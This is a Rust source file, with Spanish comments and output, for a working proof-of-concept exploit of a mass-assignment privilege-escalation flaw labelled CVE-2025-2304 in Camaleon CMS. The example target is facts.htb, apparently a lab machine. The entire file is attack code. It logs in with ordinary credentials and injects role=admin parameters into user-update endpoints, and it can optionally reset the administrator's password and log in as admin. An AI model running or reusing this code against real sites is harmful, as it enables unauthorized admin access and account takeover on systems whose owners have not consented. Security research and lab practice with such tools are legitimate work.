use anyhow::{Context, Result};
use clap::Parser;
use colored::*;
use rand::{distributions::Alphanumeric, Rng};
use regex::Regex;
use reqwest::blocking::{Client, ClientBuilder};
use scraper::{Html, Selector};
use std::collections::HashMap;
use std::thread;
use std::time::Duration;

/// CVE-2025-2304 PoC - Probar con credenciales de usuario existentes
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// URL objetivo (ej., http://facts.htb)
    target: String,

    /// Nombre de usuario existente
    #[arg(short, long)]
    username: String,

    /// Contraseña del usuario
    #[arg(short, long)]
    password: String,

    /// Proxy HTTP (ej., http://127.0.0.1:8080)
    #[arg(long)]
    proxy: Option<String>,

    /// Salida verbosa
    #[arg(short, long)]
    verbose: bool,

    /// Omitir prueba de reseteo de contraseña de admin
    #[arg(long)]
    skip_admin_test: bool,

    /// Intentar explotación sin campos de contraseña primero
    #[arg(long)]
    no_password_field: bool,
}

#[derive(Debug, Clone)]
struct UserInfo {
    id: Option<String>,
    username: Option<String>,
    role: Option<String>,
    role_name: Option<String>,
}

struct ExploitTest {
    name: String,
    url: String,
    payload: HashMap<String, String>,
    is_ajax: bool,
}

fn print_banner() {
    let banner = format!(
        "\n{}\n   CVE-2025-2304 - Camaleon CMS Escalación de Privilegios PoC\n   Versión de Usuario Pre-Registrado\n{}\n",
        "=".repeat(60).blue(),
        "=".repeat(60).blue()
    );
    println!("{}", banner);
}

/// Extraer token CSRF de una página
fn get_csrf_token(client: &Client, url: &str) -> Option<String> {
    match client.get(url).send() {
        Ok(response) => {
            let html = response.text().ok()?;
            let document = Html::parse_document(&html);

            // Intentar meta CSRF
            let meta_selector = Selector::parse("meta[name='csrf-token']").ok()?;
            if let Some(element) = document.select(&meta_selector).next() {
                return element.value().attr("content").map(|s| s.to_string());
            }

            // Intentar CSRF basado en formulario
            let input_selector = Selector::parse("input[name='authenticity_token']").ok()?;
            if let Some(element) = document.select(&input_selector).next() {
                return element.value().attr("value").map(|s| s.to_string());
            }

            None
        }
        Err(e) => {
            println!("{}[-] Error obteniendo token CSRF: {}{}", "[".red(), e, "]".red());
            None
        }
    }
}

/// Iniciar sesión con credenciales existentes
fn login_user(client: &Client, base_url: &str, username: &str, password: &str) -> Result<bool> {
    println!("{}[*] Iniciando sesión como {}...{}", "[".blue(), username, "]".blue());

    let login_url = format!("{}/admin/login", base_url);

    let csrf_token = get_csrf_token(client, &login_url)
        .context("No se pudo obtener token CSRF para inicio de sesión")?;

    let mut form = HashMap::new();
    form.insert("authenticity_token", csrf_token);
    form.insert("user[username]", username.to_string());
    form.insert("user[password]", password.to_string());

    let response = client
        .post(&login_url)
        .form(&form)
        .send()
        .context("Error al enviar solicitud de inicio de sesión")?;

    let final_url = response.url().as_str();

    if final_url.contains("dashboard") || final_url.contains("profile") {
        println!("{}[+] Sesión iniciada exitosamente{}", "[".green(), "]".green());
        Ok(true)
    } else {
        let text = response.text()?;
        println!("{}[-] Inicio de sesión fallido{}", "[".red(), "]".red());
        if text.to_lowercase().contains("error") {
            println!("{}[-] Posibles credenciales inválidas{}", "[".red(), "]".red());
        }
        Ok(false)
    }
}

/// Verificar versión de Camaleon CMS
fn check_version(client: &Client, base_url: &str) -> (String, bool) {
    println!("\n{}[*] Verificando versión de CMS...{}", "[".blue(), "]".blue());

    let profile_url = format!("{}/admin/profile/edit", base_url);

    match client.get(&profile_url).send() {
        Ok(response) => {
            if let Ok(text) = response.text() {
                let version_regex = Regex::new(r"<b>Version\s*</b>\s*([\d.]+)").unwrap();

                if let Some(caps) = version_regex.captures(&text) {
                    let version = caps.get(1).unwrap().as_str();
                    println!("{}[*] Versión detectada: {}{}", "[".yellow(), version, "]".yellow());

                    let parts: Vec<u32> = version.split('.').filter_map(|s| s.parse().ok()).collect();
                    if parts.len() >= 3 {
                        let (major, minor, patch) = (parts[0], parts[1], parts[2]);
                        if (major == 2 && minor == 9 && patch == 0) || (major == 2 && minor < 9) {
                            println!("{}[+] La versión es VULNERABLE (< 2.9.1){}", "[".green(), "]".green());
                            return (version.to_string(), true);
                        } else {
                            println!("{}[!] La versión {} debería estar parcheada (>= 2.9.1){}", "[".yellow(), version, "]".yellow());
                            println!("{}[!] Probando de todos modos...{}", "[".yellow(), "]".yellow());
                            return (version.to_string(), false);
                        }
                    }
                }
            }
        }
        Err(e) => {
            println!("{}[-] Error verificando versión: {}{}", "[".red(), e, "]".red());
        }
    }

    println!("{}[!] No se pudo determinar la versión, continuando de todos modos...{}", "[".yellow(), "]".yellow());
    ("Desconocida".to_string(), true)
}

/// Extraer ID de usuario y rol actual
fn get_user_info(client: &Client, base_url: &str) -> UserInfo {
    let profile_url = format!("{}/admin/profile/edit", base_url);

    match client.get(&profile_url).send() {
        Ok(response) => {
            if let Ok(text) = response.text() {
                let document = Html::parse_document(&text);

                // Obtener ID de usuario
                let mut user_id = None;
                let id_regex = Regex::new(r"/admin/users/(\d+)").unwrap();
                if let Some(caps) = id_regex.captures(&text) {
                    user_id = Some(caps.get(1).unwrap().as_str().to_string());
                } else {
                    let id_selector = Selector::parse("input[name='user[id]']").ok();
                    if let Some(selector) = id_selector {
                        if let Some(element) = document.select(&selector).next() {
                            user_id = element.value().attr("value").map(|s| s.to_string());
                        }
                    }
                }

                // Obtener nombre de usuario
                let mut username = None;
                if let Ok(selector) = Selector::parse("input[name='user[username]']") {
                    if let Some(element) = document.select(&selector).next() {
                        username = element.value().attr("value").map(|s| s.to_string());
                    }
                }

                // Obtener rol
                let mut role = None;
                let mut role_name = None;
                if let Ok(selector) = Selector::parse("select[name='user[role]']") {
                    if let Some(select) = document.select(&selector).next() {
                        if let Ok(option_selector) = Selector::parse("option[selected]") {
                            if let Some(selected) = select.select(&option_selector).next() {
                                role = selected.value().attr("value").map(|s| s.to_string());
                                role_name = Some(selected.text().collect::<String>().trim().to_string());
                            }
                        }
                    }
                }

                return UserInfo { id: user_id, username, role, role_name };
            }
        }
        Err(e) => {
            println!("{}[-] Error obteniendo información del usuario: {}{}", "[".red(), e, "]".red());
        }
    }

    UserInfo {
        id: None,
        username: None,
        role: None,
        role_name: None,
    }
}

/// Intentar escalación de privilegios mediante asignación masiva
fn exploit_mass_assignment(
    client: &Client,
    base_url: &str,
    user_id: &str,
    user_password: &str,
    verbose: bool,
) -> Result<bool> {
    println!("\n{}", "=".repeat(60).blue());
    println!("{}[*] Probando Vulnerabilidad de Asignación Masiva CVE-2025-2304{}", "[".blue(), "]".blue());
    println!("{}", "=".repeat(60).blue());
    println!();

    // Verificar rol inicial
    let initial_info = get_user_info(client, base_url);

    println!("{}[*] Usuario Objetivo: {} (ID: {}){}", "[".yellow(),
        initial_info.username.as_deref().unwrap_or("desconocido"),
        user_id, "]".yellow());
    println!("{}[*] Rol Actual: {} ({}){}", "[".yellow(),
        initial_info.role_name.as_deref().unwrap_or("desconocido"),
        initial_info.role.as_deref().unwrap_or("?"), "]".yellow());
    println!("{}[*] La contraseña permanecerá sin cambios{}\n", "[".green(), "]".green());

    if initial_info.role.as_deref() == Some("admin") {
        println!("{}[+] ¡El usuario ya tiene privilegios de admin!{}", "[".green(), "]".green());
        return Ok(true);
    }

    // Obtener token CSRF fresco
    let profile_url = format!("{}/admin/profile/edit", base_url);
    let csrf_token = get_csrf_token(client, &profile_url)
        .context("No se pudo obtener token CSRF")?;

    // Definir payloads de exploit a probar
    let mut exploit_tests = Vec::new();

    // Test 1: AJAX endpoint - user[role]
    let mut payload1 = HashMap::new();
    payload1.insert("user[role]".to_string(), "admin".to_string());
    exploit_tests.push(ExploitTest {
        name: "AJAX endpoint - user[role]".to_string(),
        url: format!("/admin/users/{}/updated_ajax", user_id),
        payload: payload1,
        is_ajax: true,
    });

    // Test 2: AJAX endpoint - password[role]
    let mut payload2 = HashMap::new();
    payload2.insert("password[role]".to_string(), "admin".to_string());
    exploit_tests.push(ExploitTest {
        name: "AJAX endpoint - password[role]".to_string(),
        url: format!("/admin/users/{}/updated_ajax", user_id),
        payload: payload2,
        is_ajax: true,
    });

    // Test 3: AJAX endpoint - role (nivel superior)
    let mut payload3 = HashMap::new();
    payload3.insert("role".to_string(), "admin".to_string());
    exploit_tests.push(ExploitTest {
        name: "AJAX endpoint - role (nivel superior)".to_string(),
        url: format!("/admin/users/{}/updated_ajax", user_id),
        payload: payload3,
        is_ajax: true,
    });

    // Test 4: AJAX endpoint - bandera user[admin]
    let mut payload4 = HashMap::new();
    payload4.insert("user[admin]".to_string(), "1".to_string());
    payload4.insert("user[role]".to_string(), "admin".to_string());
    exploit_tests.push(ExploitTest {
        name: "AJAX endpoint - bandera user[admin]".to_string(),
        url: format!("/admin/users/{}/updated_ajax", user_id),
        payload: payload4,
        is_ajax: true,
    });

    // Test 5: AJAX endpoint - combinado con atributos de usuario
    let mut payload5 = HashMap::new();
    payload5.insert("user[role]".to_string(), "admin".to_string());
    if let Some(ref username) = initial_info.username {
        payload5.insert("user[username]".to_string(), username.clone());
    }
    exploit_tests.push(ExploitTest {
        name: "AJAX endpoint - combinado con atributos de usuario".to_string(),
        url: format!("/admin/users/{}/updated_ajax", user_id),
        payload: payload5,
        is_ajax: true,
    });

    // Test 6: Endpoint principal - user[role]
    let mut payload6 = HashMap::new();
    payload6.insert("user[role]".to_string(), "admin".to_string());
    exploit_tests.push(ExploitTest {
        name: "Endpoint principal - user[role]".to_string(),
        url: format!("/admin/users/{}", user_id),
        payload: payload6,
        is_ajax: false,
    });

    // Test 7: Endpoint principal - atributos combinados
    let mut payload7 = HashMap::new();
    payload7.insert("user[role]".to_string(), "admin".to_string());
    if let Some(ref username) = initial_info.username {
        payload7.insert("user[username]".to_string(), username.clone());
    }
    exploit_tests.push(ExploitTest {
        name: "Endpoint principal - atributos combinados".to_string(),
        url: format!("/admin/users/{}", user_id),
        payload: payload7,
        is_ajax: false,
    });

    let total_tests = exploit_tests.len();

    for (i, test) in exploit_tests.iter().enumerate() {
        println!("{}[{}/{}] Probando: {}{}", "[".blue(), i + 1, total_tests, test.name, "]".blue());

        let url = format!("{}{}", base_url, test.url);

        // Construir datos de solicitud - MANTENER CONTRASEÑA ORIGINAL
        let mut data = HashMap::new();
        data.insert("_method".to_string(), "patch".to_string());
        data.insert("authenticity_token".to_string(), csrf_token.clone());
        data.insert("password[password]".to_string(), user_password.to_string());
        data.insert("password[password_confirmation]".to_string(), user_password.to_string());

        for (key, value) in &test.payload {
            data.insert(key.clone(), value.clone());
        }

        let mut request = client
            .post(&url)
            .header("X-CSRF-Token", &csrf_token)
            .header("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");

        if test.is_ajax {
            request = request.header("X-Requested-With", "XMLHttpRequest");
        }

        match request.form(&data).send() {
            Ok(response) => {
                if verbose {
                    println!("    Estado: {}", response.status());
                    println!("    Payload: {:?}", test.payload);
                }

                // Esperar a que los cambios se propaguen
                thread::sleep(Duration::from_millis(500));

                // Verificar si el rol cambió
                let new_info = get_user_info(client, base_url);

                if new_info.role.as_deref() == Some("admin") {
                    println!("\n{}{}", "=".repeat(60).green().bold(), "".green().bold());
                    println!("{}[+] ¡EXPLOTACIÓN EXITOSA!{}", "[".green().bold(), "]".green().bold());
                    println!("{}", "=".repeat(60).green().bold());
                    println!("{}[+] Escalación de Privilegios: {} → {}{}", "[".green(),
                        initial_info.role_name.as_deref().unwrap_or("desconocido"),
                        new_info.role_name.as_deref().unwrap_or("admin"), "]".green());
                    println!("{}[+] Endpoint Vulnerable: {}{}", "[".green(), test.url, "]".green());
                    println!("{}[+] Payload Funcional: {:?}{}", "[".green(), test.payload, "]".green());
                    println!("{}[+] Contraseña sin cambios: El usuario aún puede iniciar sesión normalmente{}", "[".green(), "]".green());
                    println!("{}[+] ¡CVE-2025-2304 CONFIRMADO!{}\n", "[".green(), "]".green());
                    return Ok(true);
                } else {
                    if verbose {
                        println!("    Resultado: Rol sin cambios ({})\n", new_info.role.as_deref().unwrap_or("?"));
                    } else {
                        println!("    {}✗ Falló{}", "".red(), "".red());
                    }
                }
            }
            Err(e) => {
                println!("    {}Error: {}{}", "".red(), e, "".red());
            }
        }
    }

    println!("\n{}[-] Todos los intentos de asignación masiva fallaron{}", "[".red(), "]".red());
    Ok(false)
}

/// Intentar escalación de privilegios SIN campos de contraseña
fn exploit_without_password_change(
    client: &Client,
    base_url: &str,
    user_id: &str,
    verbose: bool,
) -> Result<bool> {
    println!("\n{}", "=".repeat(60).blue());
    println!("{}[*] Probando Asignación Masiva SIN Campos de Contraseña{}", "[".blue(), "]".blue());
    println!("{}", "=".repeat(60).blue());
    println!();

    let initial_info = get_user_info(client, base_url);

    println!("{}[*] Probando sin campos de contraseña (enfoque más seguro){}\n", "[".yellow(), "]".yellow());

    if initial_info.role.as_deref() == Some("admin") {
        return Ok(true);
    }

    let profile_url = format!("{}/admin/profile/edit", base_url);
    let csrf_token = get_csrf_token(client, &profile_url)
        .context("No se pudo obtener token CSRF")?;

    let mut exploit_tests = Vec::new();

    // Test 1: user[role] solamente
    let mut payload1 = HashMap::new();
    payload1.insert("user[role]".to_string(), "admin".to_string());
    exploit_tests.push(ExploitTest {
        name: "Endpoint principal - solo user[role]".to_string(),
        url: format!("/admin/users/{}", user_id),
        payload: payload1,
        is_ajax: false,
    });

    // Test 2: user[role] + username
    let mut payload2 = HashMap::new();
    payload2.insert("user[role]".to_string(), "admin".to_string());
    if let Some(ref username) = initial_info.username {
        payload2.insert("user[username]".to_string(), username.clone());
    }
    exploit_tests.push(ExploitTest {
        name: "Endpoint principal - user[role] + nombre de usuario".to_string(),
        url: format!("/admin/users/{}", user_id),
        payload: payload2,
        is_ajax: false,
    });

    // Test 3: perfil completo con rol
    let mut payload3 = HashMap::new();
    payload3.insert("user[role]".to_string(), "admin".to_string());
    if let Some(ref username) = initial_info.username {
        payload3.insert("user[username]".to_string(), username.clone());
    }
    payload3.insert("user[first_name]".to_string(), "Test".to_string());
    payload3.insert("user[last_name]".to_string(), "User".to_string());
    exploit_tests.push(ExploitTest {
        name: "Endpoint principal - perfil completo con rol".to_string(),
        url: format!("/admin/users/{}", user_id),
        payload: payload3,
        is_ajax: false,
    });

    let total_tests = exploit_tests.len();

    for (i, test) in exploit_tests.iter().enumerate() {
        println!("{}[{}/{}] Probando: {}{}", "[".blue(), i + 1, total_tests, test.name, "]".blue());

        let url = format!("{}{}", base_url, test.url);

        let mut data = HashMap::new();
        data.insert("_method".to_string(), "patch".to_string());
        data.insert("authenticity_token".to_string(), csrf_token.clone());

        for (key, value) in &test.payload {
            data.insert(key.clone(), value.clone());
        }

        match client
            .post(&url)
            .header("X-CSRF-Token", &csrf_token)
            .header("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            .form(&data)
            .send()
        {
            Ok(response) => {
                if verbose {
                    println!("    Estado: {}", response.status());
                }

                thread::sleep(Duration::from_millis(500));

                let new_info = get_user_info(client, base_url);

                if new_info.role.as_deref() == Some("admin") {
                    println!("\n{}{}", "=".repeat(60).green().bold(), "".green().bold());
                    println!("{}[+] ¡EXPLOTACIÓN EXITOSA!{}", "[".green().bold(), "]".green().bold());
                    println!("{}", "=".repeat(60).green().bold());
                    println!("{}[+] Escalación de Privilegios: {} → {}{}", "[".green(),
                        initial_info.role_name.as_deref().unwrap_or("desconocido"),
                        new_info.role_name.as_deref().unwrap_or("admin"), "]".green());
                    println!("{}[+] Endpoint Vulnerable: {}{}", "[".green(), test.url, "]".green());
                    println!("{}[+] Payload Funcional: {:?}{}", "[".green(), test.payload, "]".green());
                    println!("{}[+] Sin Cambio de Contraseña: Completamente seguro para el usuario{}", "[".green(), "]".green());
                    println!("{}[+] ¡CVE-2025-2304 CONFIRMADO!{}\n", "[".green(), "]".green());
                    return Ok(true);
                } else {
                    println!("    {}✗ Falló{}", "".red(), "".red());
                }
            }
            Err(e) => {
                println!("    {}Error: {}{}", "".red(), e, "".red());
            }
        }
    }

    Ok(false)
}

/// Intentar cambiar la contraseña del usuario admin
fn exploit_admin_takeover(client: &Client, base_url: &str, verbose: bool) -> Result<bool> {
    println!("\n{}", "=".repeat(60).blue());
    println!("{}[*] Probando Ataque de Reseteo de Contraseña de Admin{}", "[".blue(), "]".blue());
    println!("{}[!] ADVERTENCIA: Esto cambiará la contraseña del admin si tiene éxito{}", "[".yellow(), "]".yellow());
    println!("{}", "=".repeat(60).blue());
    println!();

    let admin_id = "1";
    let new_password: String = format!(
        "Pwned{}!123",
        rand::thread_rng()
            .sample_iter(&Alphanumeric)
            .take(10)
            .map(char::from)
            .collect::<String>()
    );

    let profile_url = format!("{}/admin/profile/edit", base_url);
    let csrf_token = get_csrf_token(client, &profile_url)
        .context("No se pudo obtener token CSRF")?;

    let test_endpoints = vec![
        ExploitTest {
            name: "Actualización de contraseña AJAX".to_string(),
            url: format!("/admin/users/{}/updated_ajax", admin_id),
            payload: HashMap::new(),
            is_ajax: true,
        },
        ExploitTest {
            name: "Actualización de perfil principal".to_string(),
            url: format!("/admin/users/{}", admin_id),
            payload: HashMap::new(),
            is_ajax: false,
        },
    ];

    for (i, test) in test_endpoints.iter().enumerate() {
        println!("{}[{}/{}] Probando: {}{}", "[".blue(), i + 1, test_endpoints.len(), test.name, "]".blue());

        let url = format!("{}{}", base_url, test.url);

        let mut data = HashMap::new();
        data.insert("_method".to_string(), "patch".to_string());
        data.insert("authenticity_token".to_string(), csrf_token.clone());
        data.insert("password[password]".to_string(), new_password.clone());
        data.insert("password[password_confirmation]".to_string(), new_password.clone());

        let mut request = client
            .post(&url)
            .header("X-CSRF-Token", &csrf_token);

        if test.is_ajax {
            request = request.header("X-Requested-With", "XMLHttpRequest");
        }

        match request.form(&data).send() {
            Ok(response) => {
                if verbose {
                    println!("    Estado: {}", response.status());
                }

                if try_admin_login(base_url, &new_password, client.clone())? {
                    println!("\n{}{}", "=".repeat(60).green().bold(), "".green().bold());
                    println!("{}[+] ¡TOMA DE CONTROL DE ADMIN EXITOSA!{}", "[".green().bold(), "]".green().bold());
                    println!("{}", "=".repeat(60).green().bold());
                    println!("{}[+] Contraseña de admin cambiada exitosamente{}", "[".green(), "]".green());
                    println!("{}[+] Nueva contraseña: {}{}", "[".green(), new_password, "]".green());
                    println!("{}[+] ¡CVE-2025-2304 CONFIRMADO!{}\n", "[".green(), "]".green());
                    return Ok(true);
                } else {
                    println!("    {}✗ Falló{}", "".red(), "".red());
                }
            }
            Err(e) => {
                println!("    {}Error: {}{}", "".red(), e, "".red());
            }
        }
    }

    println!("\n{}[-] Reseteo de contraseña de admin falló{}", "[".red(), "]".red());
    Ok(false)
}

/// Intentar iniciar sesión como admin con nueva contraseña
fn try_admin_login(base_url: &str, password: &str, _original_client: Client) -> Result<bool> {
    let test_client = ClientBuilder::new()
        .cookie_store(true)
        .danger_accept_invalid_certs(true)
        .build()?;

    let login_url = format!("{}/admin/login", base_url);
    let csrf_token = match get_csrf_token(&test_client, &login_url) {
        Some(token) => token,
        None => return Ok(false),
    };

    let mut data = HashMap::new();
    data.insert("authenticity_token", csrf_token);
    data.insert("user[username]", "admin".to_string());
    data.insert("user[password]", password.to_string());

    match test_client.post(&login_url).form(&data).send() {
        Ok(response) => {
            let final_url = response.url().to_string();
            if let Ok(text) = response.text() {
                if final_url.contains("dashboard") && !text.to_lowercase().contains("error") {
                    let info = get_user_info(&test_client, base_url);
                    return Ok(info.role.as_deref() == Some("admin"));
                }
            }
        }
        Err(_) => return Ok(false),
    }

    Ok(false)
}

fn main() -> Result<()> {
    print_banner();

    let args = Args::parse();

    let base_url = args.target.trim_end_matches('/');

    println!("{}[*] Objetivo: {}{}", "[".yellow(), base_url, "]".yellow());
    println!("{}[*] Nombre de usuario: {}{}", "[".yellow(), args.username, "]".yellow());
    println!("{}[*] Contraseña: {}{}", "[".yellow(), "*".repeat(args.password.len()), "]".yellow());

    // Configurar sesión
    let mut client_builder = ClientBuilder::new()
        .cookie_store(true)
        .danger_accept_invalid_certs(true);

    if let Some(proxy) = &args.proxy {
        let proxy_url = reqwest::Proxy::all(proxy)?;
        client_builder = client_builder.proxy(proxy_url);
        println!("{}[*] Proxy: {}{}", "[".yellow(), proxy, "]".yellow());
    }

    let client = client_builder.build()?;

    println!();

    // Iniciar sesión
    if !login_user(&client, base_url, &args.username, &args.password)? {
        println!("\n{}[!] Fallo al iniciar sesión. Verifica las credenciales e intenta de nuevo.{}", "[".red(), "]".red());
        std::process::exit(1);
    }

    // Verificar versión
    let (_version, _potentially_vuln) = check_version(&client, base_url);

    // Obtener información del usuario
    let user_info = get_user_info(&client, base_url);

    let user_id = match user_info.id {
        Some(id) => id,
        None => {
            println!("{}[-] No se pudo determinar el ID del usuario{}", "[".red(), "]".red());
            std::process::exit(1);
        }
    };

    let mut success = false;

    // Intentar sin campos de contraseña primero si se solicita
    if args.no_password_field {
        success = exploit_without_password_change(&client, base_url, &user_id, args.verbose)?;
        if success {
            println!("{}{}[✓] VULNERABILIDAD CVE-2025-2304 CONFIRMADA{}\n", "".green().bold(), "[".green().bold(), "]".green().bold());
            std::process::exit(0);
        }
    }

    // Probar asignación masiva con preservación de contraseña
    success = exploit_mass_assignment(&client, base_url, &user_id, &args.password, args.verbose)?;

    if success {
        println!("{}{}[✓] VULNERABILIDAD CVE-2025-2304 CONFIRMADA{}\n", "".green().bold(), "[".green().bold(), "]".green().bold());
        std::process::exit(0);
    }

    // Probar toma de control de admin (si no se omite)
    if !args.skip_admin_test {
        println!("\n{}[!] Intentando reseteo de contraseña de admin (prueba destructiva)...{}", "[".yellow(), "]".yellow());
        println!("{}¿Continuar? [y/N]: {}", "".yellow(), "".yellow());

        let mut input = String::new();
        std::io::stdin().read_line(&mut input)?;

        if input.trim().to_lowercase() == "y" {
            success = exploit_admin_takeover(&client, base_url, args.verbose)?;

            if success {
                println!("{}{}[✓] VULNERABILIDAD CVE-2025-2304 CONFIRMADA{}\n", "".green().bold(), "[".green().bold(), "]".green().bold());
                std::process::exit(0);
            }
        }
    }

    // No se encontraron vulnerabilidades
    println!("\n{}{}", "=".repeat(60).red().bold(), "".red().bold());
    println!("{}[✗] VULNERABILIDAD NO EXPLOTABLE{}", "[".red().bold(), "]".red().bold());
    println!("{}", "=".repeat(60).red().bold());
    println!("{}[-] Todos los intentos de explotación fallaron{}", "[".red(), "]".red());
    println!("{}[*] Posibles razones:{}", "[".yellow(), "]".yellow());
    println!("    - El objetivo está parcheado (versión >= 2.9.1)");
    println!("    - Hay filtrado de parámetros fuerte");
    println!("    - Se implementaron controles de seguridad personalizados");
    println!();

    std::process::exit(1);
}
